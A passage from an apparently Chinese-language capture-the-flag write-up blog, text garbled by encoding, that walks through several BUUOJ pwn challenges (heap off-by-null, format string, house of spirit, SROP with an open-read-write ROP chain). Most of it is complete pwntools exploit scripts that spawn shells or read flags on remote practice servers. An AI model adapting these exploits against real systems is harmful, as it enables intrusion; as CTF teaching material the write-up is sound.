title="åˆ†æ"></a>åˆ†æ</h3><ul><li>å¼€å¤´mmap ä¸€æ®µå†…å­˜ rwx</li><li>libc 2.27çš„off by null</li><li>æ²¡æœ‰show</li></ul><h3 id="æ”»å‡»æ€è·¯-6"><a href="#æ”»å‡»æ€è·¯-6" class="headerlink" title="æ”»å‡»æ€è·¯"></a>æ”»å‡»æ€è·¯</h3><ul><li>å…ˆä¸Šæ¥ç”³è¯·ä¸€ä¸ª0x1000çš„å†…å­˜å—ï¼Œç„¶åé‡Šæ”¾ï¼Œå¯ä»¥ä¿è¯æ¯æ¬¡ç”³è¯·çš„å †å—ä¸Šéƒ½å­˜æœ‰libcä¿¡æ¯ï¼Œå‡†å¤‡æ”»å‡»åˆ©ç”¨</li><li>off by null ç•™å‡º 2ä¸ªé‡å çš„å †å—</li><li>ä¸€ä¸ªæ”»å‡» mmapï¼Œå¦ä¸€ä¸ªæ”»å‡»malloc hook</li></ul><p>ç”±äºtcache åŸºæœ¬æ²¡æœ‰ä»€ä¹ˆæ£€æŸ¥ï¼Œåˆ©ç”¨èµ·æ¥è¾ƒä¸ºå®¹æ˜“ã€‚</p><h3 id="exp-9"><a href="#exp-9" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><span class="hljs-comment"># encoding: utf-8</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./sctf_2019_easy_heap'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">28382</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]rce18 = [<span class="hljs-number">0x4f2c5</span>,<span class="hljs-number">0x4f322</span>,<span class="hljs-number">0x10a38c</span>]realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size)</span>:</span>    sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'ize'</span>,str(size))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,data)</span>:</span>    sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">"dex"</span>,str(idx))    sa(<span class="hljs-string">'tent'</span>,str(data))ru(<span class="hljs-string">'0x'</span>)mmap = int(r(<span class="hljs-number">10</span>),<span class="hljs-number">16</span>)add(<span class="hljs-number">0x1000</span>)add(<span class="hljs-number">0x10</span>) <span class="hljs-comment">#1</span>free(<span class="hljs-number">0</span>)add(<span class="hljs-number">0x90</span>) <span class="hljs-comment">#0</span>add(<span class="hljs-number">0x28</span>) <span class="hljs-comment">#2</span>add(<span class="hljs-number">0x18</span>) <span class="hljs-comment">#3</span>add(<span class="hljs-number">0xf0</span>) <span class="hljs-comment">#4</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">7</span>):    add(<span class="hljs-number">0x90</span>)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">7</span>):    free(i+<span class="hljs-number">5</span>)    add(<span class="hljs-number">0xf0</span>)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">7</span>):    free(i+<span class="hljs-number">5</span>)free(<span class="hljs-number">0</span>)edit(<span class="hljs-number">3</span>,<span class="hljs-string">'\x00'</span> * <span class="hljs-number">0x10</span> + p64(<span class="hljs-number">0xb0</span>+<span class="hljs-number">0x40</span>))free(<span class="hljs-number">4</span>)add(<span class="hljs-number">0x28</span>) <span class="hljs-comment">#0</span>add(<span class="hljs-number">0x28</span>) <span class="hljs-comment">#4</span>add(<span class="hljs-number">0x18</span>) <span class="hljs-comment">#5</span>add(<span class="hljs-number">0x10</span>) <span class="hljs-comment">#6</span>add(<span class="hljs-number">0x28</span>) <span class="hljs-comment">#7</span>add(<span class="hljs-number">0x18</span>) <span class="hljs-comment">#8</span>free(<span class="hljs-number">4</span>)free(<span class="hljs-number">7</span>)edit(<span class="hljs-number">2</span>,<span class="hljs-string">'\x60'</span> + <span class="hljs-string">'\n'</span>)edit(<span class="hljs-number">0</span>,p64(mmap) + <span class="hljs-string">'\n'</span>)add(<span class="hljs-number">0x28</span>) <span class="hljs-comment">#4</span>add(<span class="hljs-number">0x28</span>) <span class="hljs-comment">#7</span>add(<span class="hljs-number">0x28</span>) <span class="hljs-comment">#9</span>free(<span class="hljs-number">6</span>)free(<span class="hljs-number">8</span>)edit(<span class="hljs-number">3</span>,<span class="hljs-string">'\xc0'</span> + <span class="hljs-string">'\n'</span>)edit(<span class="hljs-number">5</span>,p8(<span class="hljs-number">0x30</span>) + <span class="hljs-string">'\n'</span>)add(<span class="hljs-number">0x18</span>) <span class="hljs-comment">#6</span>add(<span class="hljs-number">0x18</span>) <span class="hljs-comment">#8</span>add(<span class="hljs-number">0x18</span>) <span class="hljs-comment">#10</span>shellcode = <span class="hljs-string">"""  call here  .ascii "/bin/sh"  .byte 0here:   pop rdi   xor rsi,rsi   xor rdx,rdx   mov rax,0x3b   syscall"""</span>edit(<span class="hljs-number">9</span>,asm(shellcode) + <span class="hljs-string">'\n'</span>)edit(<span class="hljs-number">10</span>,p64(mmap) + <span class="hljs-string">'\n'</span>)add(<span class="hljs-number">0x200</span>)<span class="hljs-comment"># debug()</span>itr()</code></pre></div><h3 id="é¢˜è®°-5"><a href="#é¢˜è®°-5" class="headerlink" title="é¢˜è®°"></a>é¢˜è®°</h3><p>è¿™ä¸ªé¢˜è¿˜æœ‰ä¸€ç§åŠæ³•æ”»å‡»mmapå°±æ˜¯ç”¨unlinkæ¥è¿›è¡Œï¼Œå› ä¸ºé¢˜ç›®å°±ç»™äº†&amp;heap ï¼Œé¢˜ç›®é¢„æœŸè§£å°±æ˜¯è¿™æ ·ã€‚</p><p>å¦å¤–ä¸€ç§è§£æ³•ï¼Œå°±æ˜¯æ”»å‡»stdoutï¼Œæ³„æ¼libcåœ°å€ï¼Œç„¶åæ”»å‡»malloc hookã€‚</p><h2 id="ciscn-2019-sw-1"><a href="#ciscn-2019-sw-1" class="headerlink" title="ciscn_2019_sw_1"></a><code>ciscn_2019_sw_1</code></h2><h4 id="åˆ†æ-10"><a href="#åˆ†æ-10" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h4><p>32ä½ï¼Œå•æ¬¡æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„åˆ©ç”¨ã€‚æ— æ³•ä¸€æ¬¡æ€§çš„è·å¾—shellã€‚è‡³å°‘è¿è¡Œ2æ¬¡ã€‚</p><p>æ”»å‡»<code>__do_global_dtors_aux_fini_array_entry</code>ï¼Œè®©å…¶å†æ¬¡è¿è¡Œä¸€æ¬¡ï¼Œä¸”åŒæ—¶æ”¹ printf got çš„å€¼ä¸ºsystem pltã€‚ç„¶åé€ä¸€ä¸ª <code>/bin/sh\x00</code>å³å¯ã€‚</p><h4 id="exp-10"><a href="#exp-10" class="headerlink" title="exp"></a>exp</h4><div class="hljs"><pre><code class="hljs python">offset = <span class="hljs-number">4</span>payload = fmtstr_payload(offset,&#123;<span class="hljs-number">0x804979C</span>:<span class="hljs-number">0x8048534</span>,elf.got[<span class="hljs-string">'printf'</span>]:elf.plt[<span class="hljs-string">'system'</span>]&#125;,write_size = <span class="hljs-string">"short"</span>,numbwritten = <span class="hljs-number">0</span>)s(payload)sleep(<span class="hljs-number">1</span>)sa(<span class="hljs-string">'name'</span>,<span class="hljs-string">'/bin/sh\x00'</span>)itr()</code></pre></div><p>å› ä¸ºæ˜¯32ä½ï¼Œç”¨<code>fmtstr_payload</code>æ˜¯å¾ˆå¥½ç”¨çš„ã€‚</p><h2 id="lctf2016-pwn200"><a href="#lctf2016-pwn200" class="headerlink" title="lctf2016_pwn200"></a><code>lctf2016_pwn200</code></h2><h3 id="åˆ†æ-11"><a href="#åˆ†æ-11" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><ul><li>å¼€å¤´ä¸è¾“å…¥<code>\n</code>ï¼Œ48å­—ç¬¦å¯ä»¥æ³„éœ²å‡ºstackåœ°å€</li><li>æœ‰ç¬¬ä¸€æ®µå¯æ§çš„æ ˆï¼Œä¸”å¯ä»¥è¦†ç›–åˆ°heap ptr</li></ul><div class="hljs"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sub_400A29</span><span class="hljs-params">()</span></span>&#123;  <span class="hljs-keyword">char</span> buf; <span class="hljs-comment">// [rsp+0h] [rbp-40h]</span>  <span class="hljs-keyword">char</span> *dest; <span class="hljs-comment">// [rsp+38h] [rbp-8h]</span>  dest = (<span class="hljs-keyword">char</span> *)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x40</span>uLL);  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"give me money~"</span>);  read(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">0x40</span>uLL);  <span class="hljs-built_in">strcpy</span>(dest, &amp;buf);  ptr = dest;  <span class="hljs-keyword">return</span> sub_4009C4();&#125;</code></pre></div><ul><li>ä¸€æ¬¡åªèƒ½ç”³è¯·ä¸€ä¸ªå †ï¼Œå¤§å°0-0x80,ä¸”å…ˆé‡Šæ”¾æ‰èƒ½å†æ¬¡ç”³è¯·ã€‚</li></ul><p>ä¿æŠ¤æƒ…å†µï¼Œæ— ä»»ä½•ä¿æŠ¤ï¼Œæ‰€ä»¥å¯ä»¥å†™shellcodeï¼Œjmp ä¸Šå»å³å¯ã€‚</p><h3 id="æ”»å‡»æ€è·¯-7"><a href="#æ”»å‡»æ€è·¯-7" class="headerlink" title="æ”»å‡»æ€è·¯"></a>æ”»å‡»æ€è·¯</h3><ul><li>åˆ©ç”¨å¯æ§çš„æ ˆï¼Œhos åœ¨æ ˆä¸Šfake ä¸€ä¸ªå †ï¼Œä¿è¯å¯ä»¥æ”¹åˆ°ret address</li><li>ç”³è¯·åŒå¤§å°çš„å †ï¼Œæ”¹ret address jmp åˆ° shellcode</li></ul><h3 id="exp-11"><a href="#exp-11" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><span class="hljs-comment"># encoding: utf-8</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./pwn200'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">26670</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size,data)</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'long'</span>,str(size))    sa(<span class="hljs-string">'me'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">()</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'2'</span>)shellcode = asm(shellcraft.sh())sa(<span class="hljs-string">'u'</span>,shellcode)ru(<span class="hljs-string">'\x05'</span>)leak_stack = uu64(r(<span class="hljs-number">6</span>))info_addr(<span class="hljs-string">'leak_stack'</span>,leak_stack)shellcode_addr = leak_stack - <span class="hljs-number">0x50</span><span class="hljs-comment"># debug()</span>sla(<span class="hljs-string">'id'</span>,<span class="hljs-string">'65'</span>)payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">5</span> + p64(<span class="hljs-number">0x41</span>) + p64(<span class="hljs-number">0</span>) + p64(leak_stack - <span class="hljs-number">0x90</span>)sa(<span class="hljs-string">'money'</span>,payload)free()payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(shellcode_addr)add(<span class="hljs-number">0x38</span>,payload)sleep(<span class="hljs-number">0.2</span>)sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'3'</span>)<span class="hljs-comment"># debug()</span>itr()</code></pre></div><h2 id="vn-pwn-babybabypwn"><a href="#vn-pwn-babybabypwn" class="headerlink" title="vn_pwn_babybabypwn"></a><code>vn_pwn_babybabypwn</code></h2><h3 id="åˆ†æ-12"><a href="#åˆ†æ-12" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><ul><li>å¼€äº†æ²™ç›’ä¿æŠ¤ï¼Œåªèƒ½orw</li><li>å¼€å§‹ç»™äº†libcåœ°å€</li><li>ç¨‹åºä¸»è¦æ‰§è¡Œäº†<code>rt_sigreturn</code>ï¼Œè‚¯å®šæ˜¯å¥”ç€sropå»çš„</li></ul><h3 id="éš¾ç‚¹"><a href="#éš¾ç‚¹" class="headerlink" title="éš¾ç‚¹"></a>éš¾ç‚¹</h3><ul><li>orwçš„ropåº”è¯¥å¾€å“ªé‡Œå†™ï¼Œæ ˆåœ°å€æ˜¯ä¸çŸ¥é“çš„</li></ul><p>å¯ä»¥åœ¨libcä¸Šæ‰¾ä¸€æ®µæ— ç”¨çš„åœ°æ–¹è¿›è¡Œå†™å³å¯ã€‚æ¯”å¦‚ libcçš„bssï¼Œfree hookæ®µã€‚</p><ul><li>æœ‰çš„gadget ä½¿ç”¨ropgadgetæ‰¾ä¸åˆ°</li></ul><div class="hljs"><pre><code class="hljs python">libc.search(asm(<span class="hljs-string">"syscall \nret"</span>)).next()</code></pre></div><p>å¯ä»¥é€šè¿‡æœºå™¨ç æ¥æ‰¾ã€‚</p><ul><li>srop ä¸­frameæ‰§è¡Œçš„é¡ºåº</li></ul><p>frame.rip æ˜¯å…ˆæ‰§è¡Œçš„åœ°å€ã€‚è€Œ frame.rsp çš„å€¼å°±æ˜¯æˆ‘ä»¬æ‰§è¡Œå®Œ frame.rip åï¼Œè¦æ‰§è¡Œçš„å€¼</p><h3 id="exp-12"><a href="#exp-12" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python">#!/usr/bin/env python# encoding: utf-8from pwn import *import timelocal_file  = './vn_pwn_babybabypwn'elf = ELF(local_file)context.log_level = 'debug'debug = 0if debug:    io = process(local_file)    libc = elf.libcelse:    io = remote('node3.buuoj.cn',25535)    libc = elf.libc    #libc = ELF('.')context.arch = elf.archcontext.terminal = ['tmux','neww']#,''splitw','-h'rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]rce18 = [0x4f2c5,0x4f322,0x10a38c]realloc = [0x2,0x4,0x6,0xB,0xC,0xD]arae18 = 0x3ebca0s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, '\0'))uu64    = lambda data               :u64(data.ljust(8, '\0'))info_addr = lambda tag, addr        :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript='b main')    gdb.attach(io)    pause()'line  CODE  JT   JF      K================================= 0000: 0x20 0x00 0x00 0x00000004  A = arch 0001: 0x15 0x00 0x0d 0xc000003e  if (A != ARCH_X86_64) goto 0015 0002: 0x20 0x00 0x00 0x00000000  A = sys_number 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005 0004: 0x15 0x00 0x0a 0xffffffff  if (A != 0xffffffff) goto 0015 0005: 0x15 0x09 0x00 0x00000009  if (A == mmap) goto 0015 0006: 0x15 0x08 0x00 0x0000000a  if (A == mprotect) goto 0015 0007: 0x15 0x07 0x00 0x00000029  if (A == socket) goto 0015 0008: 0x15 0x06 0x00 0x0000002a  if (A == connect) goto 0015 0009: 0x15 0x05 0x00 0x00000031  if (A == bind) goto 0015 0010: 0x15 0x04 0x00 0x00000032  if (A == listen) goto 0015 0011: 0x15 0x03 0x00 0x00000038  if (A == clone) goto 0015 0012: 0x15 0x02 0x00 0x00000039  if (A == fork) goto 0015 0013: 0x15 0x01 0x00 0x0000003b  if (A == execve) goto 0015 0014: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0015: 0x06 0x00 0x00 0x00000000  return KILL'ru('0x')libc_base =  int(r(12),16) - libc.sym['puts']info_addr('libc_base',libc_base)free_hook = 0x3c67a8 + libc_baseread = libc.sym['read'] + libc_baseputs = libc.sym['puts'] + libc_baseopen = libc.sym['open'] + libc_basepop_rdi= 0x0000000000021102 + libc_basepop_rsi = 0x00000000000202e8 + libc_basepop_rdx = 0x0000000000001b92 + libc_basesyscall_ret = libc.search(asm("syscall \nret")).next() + libc_base# syscall_ret = libc_base + 0x00000000000bc375 #: syscall; ret; frame = SigreturnFrame()frame.rax = 0frame.rdi = 0frame.rsi = free_hookframe.rdx = 0x300frame.rip = syscall_retframe.rsp = free_hookpayload = str(frame)[8:] #å‰8å­—èŠ‚æ˜¯rt_sigreturn å…¶å¹¶ä¸éœ€è¦ä¼ªé€ ã€‚ç¨‹åºæ˜¯ä¸»åŠ¨è°ƒç”¨çš„ sigreturn# print(hex(len(frame)))s(payload)orw = flat([    pop_rdi,0,pop_rsi,free_hook,pop_rdx,8,read,    pop_rdi,free_hook,pop_rsi,0,pop_rdx,0,open,    pop_rdi,3,pop_rsi,free_hook,pop_rdx,0x30,read,    pop_rdi,free_hook,puts])s(orw)sleep(0.2)s('./flag')# debug()itr()</code></pre></div><h3 id="é¢˜è®°-6"><a href="#é¢˜è®°-6" class="headerlink" title="é¢˜è®°"></a>é¢˜è®°</h3><div class="hljs"><pre><code class="hljs python">payload = str(frame)[<span class="hljs-number">8</span>:]</code></pre></div><p>å¯¹äºä¸ºä»€ä¹ˆè¦ä»8å­—èŠ‚å¼€å§‹çš„ç†è§£ï¼Ÿ</p><p>å‰8å­—èŠ‚æ˜¯<code>rt_sigreturn</code>,å…¶æœ‰ä»€ä¹ˆç”¨ï¼Ÿ</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/votJbl.png" srcset="/img/loading.gif" alt></p><p>åœ¨ç¬¬äºŒæ­¥çš„æ—¶å€™ï¼Œå†…æ ¸ä¼šå¸®ç”¨æˆ·è¿›ç¨‹å°†å…¶ä¸Šä¸‹æ–‡ä¿å­˜åœ¨è¯¥è¿›ç¨‹çš„æ ˆä¸Šï¼Œç„¶ååœ¨æ ˆé¡¶å¡«ä¸Šä¸€ä¸ªåœ°å€<code>rt_sigreturn</code>ï¼Œè¿™ä¸ªåœ°å€æŒ‡å‘ä¸€æ®µä»£ç ï¼Œåœ¨è¿™æ®µä»£ç ä¸­ä¼šè°ƒç”¨sigreturnç³»ç»Ÿè°ƒç”¨ã€‚å› æ­¤ï¼Œå½“signal handleræ‰§è¡Œå®Œä¹‹åï¼Œæ ˆæŒ‡é’ˆï¼ˆstack pointerï¼‰å°±æŒ‡å‘<code>rt_sigreturn</code>ï¼Œæ‰€ä»¥ï¼Œsignal handlerå‡½æ•°çš„æœ€åä¸€æ¡retæŒ‡ä»¤ä¼šä½¿å¾—æ‰§è¡Œæµè·³è½¬åˆ°è¿™æ®µsigreturnä»£ç ï¼Œè¢«åŠ¨åœ°è¿›è¡Œsigreturnç³»ç»Ÿè°ƒç”¨,æŠŠåŸæ¥ä¿å­˜çš„å¯„å­˜å™¨ä¿¡æ¯å¼¹å›å»ï¼Œæœ€åæ¢å¤è¿›ç¨‹çš„æ‰§è¡Œã€‚</p><p>ç”±æ­¤å¯ä»¥å¾—å‡ºï¼Œå› ä¸ºç¨‹åºæ˜¯ä¸»åŠ¨è°ƒç”¨sigreturnçš„ï¼Œå¹¶ä¸éœ€è¦<code>rt_sigreturn</code>æŒ‡å‘ä¸€æ®µä»£ç ï¼Œå†è°ƒç”¨sigreturnç³»ç»Ÿè°ƒç”¨ã€‚</p><h2 id="ciscn-2019-final-4"><a href="#ciscn-2019-final-4" class="headerlink" title="ciscn_2019_final_4"></a><code>ciscn_2019_final_4</code></h2><p>è¿™ä¸ªé¢˜è¿˜æ˜¯å¾ˆå¥½çš„é¢˜ç›®ï¼Œè€ƒå¯Ÿäº†å¾ˆå¤šçš„åŸºç¡€çŸ¥è¯†ç‚¹ã€‚</p><h3 id="åˆ†æ-13"><a href="#åˆ†æ-13" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><ul><li>å¼€å¯äº†æ²™ç›’ç¦ç”¨execve</li><li>å¼€å¤´è®©ä½ è¾“å…¥nameï¼Œæœ‰ä¸€æ®µå¯æ§çš„æ ˆç©ºé—´ï¼Œä¸”è¾ƒå¤§</li><li>pieä¿æŠ¤æ²¡æœ‰å¼€</li><li>å­˜åœ¨åè°ƒè¯•ï¼Œä½¿ç”¨ptraceåšçš„ï¼Œç›´æ¥gdb attachè¿‡å»ä¼šè¿›å…¥å­ç¨‹åºï¼Œçœ‹ä¸åˆ°å †æƒ…å†µ(ç›´æ¥åœ¨fork æ±‡ç¼–å¤„ï¼Œæ”¹æ±‡ç¼–ï¼Œ<code>jmp åˆ°ç¨‹åºè¾“å‡ºå­—ç¬¦ä¸²çš„åœ°æ–¹å³å¯</code> )</li><li>watchå‡½æ•°ä¸­ä¹Ÿç”¨ptraceï¼Œç›‘è§†äº†<code>openï¼Œmmapï¼Œforkï¼Œvforkï¼Œptrace</code> </li></ul><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )  &#123;    ptrace(PTRACE_SYSCALL, a1, <span class="hljs-number">0L</span>L, <span class="hljs-number">0L</span>L);    waitpid(a1, &amp;stat_loc, <span class="hljs-number">0</span>);    <span class="hljs-keyword">if</span> ( !(stat_loc &amp; <span class="hljs-number">0x7F</span>) || (<span class="hljs-keyword">char</span>)((<span class="hljs-keyword">char</span>)((stat_loc &amp; <span class="hljs-number">0x7F</span>) + <span class="hljs-number">1</span>) &gt;&gt; <span class="hljs-number">1</span>) &gt; <span class="hljs-number">0</span> || (stat_loc &amp; <span class="hljs-number">0xFF00</span>) &gt;&gt; <span class="hljs-number">8</span> != <span class="hljs-number">5</span> )      <span class="hljs-keyword">break</span>;    ptrace(PTRACE_GETREGS, a1, <span class="hljs-number">0L</span>L, &amp;v3);    v2 = v4;    <span class="hljs-keyword">if</span> ( v4 == <span class="hljs-number">2</span> || v2 == <span class="hljs-number">9</span> || v2 == <span class="hljs-number">0x39</span> || v2 == <span class="hljs-number">0x3A</span> || v2 == <span class="hljs-number">0x65</span> )    &#123;      <span class="hljs-built_in">puts</span>(<span class="hljs-string">"hey! what are you doing?"</span>);      <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);    &#125;  &#125;</code></pre></div><p>è¿™é‡Œå¯ä»¥ç›‘è§†ä¸€ä¸‹execveï¼Œå¥½åƒå°±å¯ä»¥ä¸ç”¨å¼€æ²™ç®±äº†ã€‚</p><h4 id="æ¼æ´ç‚¹-1"><a href="#æ¼æ´ç‚¹-1" class="headerlink" title="æ¼æ´ç‚¹"></a>æ¼æ´ç‚¹</h4><p>å­˜åœ¨uaf</p><h3 id="éš¾ç‚¹-1"><a href="#éš¾ç‚¹-1" class="headerlink" title="éš¾ç‚¹"></a>éš¾ç‚¹</h3><h4 id="orwçš„rop-chainå¾€å“ªé‡Œè¯»"><a href="#orwçš„rop-chainå¾€å“ªé‡Œè¯»" class="headerlink" title="orwçš„rop chainå¾€å“ªé‡Œè¯»"></a>orwçš„rop chainå¾€å“ªé‡Œè¯»</h4><p>ç¨‹åºè‡ªèº«æ˜¯å­˜åœ¨è¾ƒå°‘çš„gadgetsçš„ï¼Œæƒ³ç›´æ¥å®Œæˆorw çš„rop chainï¼Œæ˜¯ä¸å¯èƒ½çš„ã€‚<br>ä¸Šæ¥å› ä¸ºæ²¡å¼€pieï¼Œèƒ½ç®€å•çš„å®Œæˆä¸€ä¸ªreadåŠŸèƒ½ã€‚åœ¨æ³„æ¼libcä»¥åï¼Œå°±æœ‰æ›´å¤§çš„å‘æŒ¥ç©ºé—´äº†ã€‚</p><p>å¼€å¤´nameæœ‰ä¸€å¤§å—å¯æ§åœ°å€ï¼Œè¯¥æ€ä¹ˆä½¿ç”¨ä¸Šã€‚å…ˆè¾“å…¥ä¸€æ®µåƒåœ¾æ•°æ®ï¼Œç•™ç€å¯»æ‰¾ã€‚</p><div class="hljs"><pre><code class="hljs python">sa(<span class="hljs-string">'name'</span>,<span class="hljs-string">'chumen77'</span>*<span class="hljs-number">10</span>)</code></pre></div><p>åœ¨æ§åˆ¶malloc hookåï¼Œéšæ„å†™ä¸ªåœ°å€ï¼Œè®©å…¶crashåœ¨è¿™é‡Œï¼ŒæŸ¥çœ‹ä¸‹æ ˆåœ°å€ï¼š</p><div class="hljs"><pre><code class="hljs python">data = <span class="hljs-number">3</span> * <span class="hljs-string">'\x00'</span> + p64(<span class="hljs-number">0xdeadbeef</span>)add(<span class="hljs-number">0x68</span>,data)</code></pre></div><p><img src="http://qiqianyun.chumen77.xyz/uPic/JsY1bN.png" srcset="/img/loading.gif" alt><br>å‘ç°æ–­åœ¨0xdeadbeefï¼Œæ ˆä¸Šå¯ä»¥çœ‹åˆ°è¾“å…¥çš„nameæƒ…å†µã€‚</p><p>æ­¤å¤„æ¥ä¸€ä¸ªæ ˆåŠ«æŒï¼Œå¢åŠ rsp æŒ‡é’ˆ0x38 ï¼Œæ¥ç€retä¸Šå»ï¼Œå°±å¯ä»¥æ‰§è¡Œnameä¸Šçš„ä¸œè¥¿ï¼Œè¿™ä¸ªä¸œè¥¿è‚¯å®šå†™æˆä»…èƒ½å®Œæˆçš„read rop chainã€‚</p><p>å› ä¸ºpieæ²¡å¼€ï¼Œå¯ä»¥ä½¿ç”¨è¿™ä¸ªæ–°çš„read 